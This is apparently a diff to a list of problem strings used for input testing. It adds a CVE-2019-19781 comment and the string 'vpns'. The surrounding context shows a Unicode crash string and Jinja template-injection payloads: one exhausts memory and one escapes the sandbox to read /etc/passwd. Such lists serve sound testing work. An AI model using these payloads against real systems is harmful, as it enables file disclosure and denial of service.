@@ -740,3 +740,7 @@ Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗
 
 {% print 'x' * 64 * 1024**3 %}
 {{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+
+# Due to CVE-2019-19781 many Citrix gateways were configured to forbid requests with paths containing '/vpns/'
+
+vpns
